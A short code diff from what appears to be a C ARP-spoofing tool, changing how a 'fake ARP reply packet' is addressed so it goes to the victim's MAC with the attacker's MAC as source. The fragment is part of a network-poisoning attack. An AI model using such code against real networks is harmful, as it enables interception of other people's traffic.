@@ -211,7 +211,7 @@ int main(int argc, char *argv[])
 	
 	printf("[+] Creating fake ARP reply packet: ");
 
-	memset(arp_reply->DMAC, 0xFF, 6 * sizeof(uint8_t));
+	memcpy(arp_reply->DMAC, sender_MAC_array, 6 * sizeof(uint8_t));
 	memcpy(arp_reply->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
 	arp_reply->ETHTYPE = htons(ETHERTYPE_ARP);
 
